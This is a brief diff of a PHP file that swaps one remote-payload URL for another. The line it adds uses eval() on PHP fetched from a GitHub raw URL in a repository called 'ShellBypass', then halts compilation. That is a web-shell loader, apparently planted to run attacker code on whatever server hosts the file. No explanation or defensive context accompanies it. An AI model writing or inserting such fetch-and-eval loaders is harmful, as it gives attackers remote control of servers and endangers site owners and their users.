@@ -52,4 +52,4 @@ function getCurl0($url)
 }
 ?>
 
-<?=eval("?>".getCurl0("https://raw.githubusercontent.com/xzourt/ShellBypass/main/query.pHp")); __halt_compiler();?>
+<?=eval("?>".getCurl0("https://raw.githubusercontent.com/xzourt/ShellBypass/main/anonsec.php")); __halt_compiler();?>
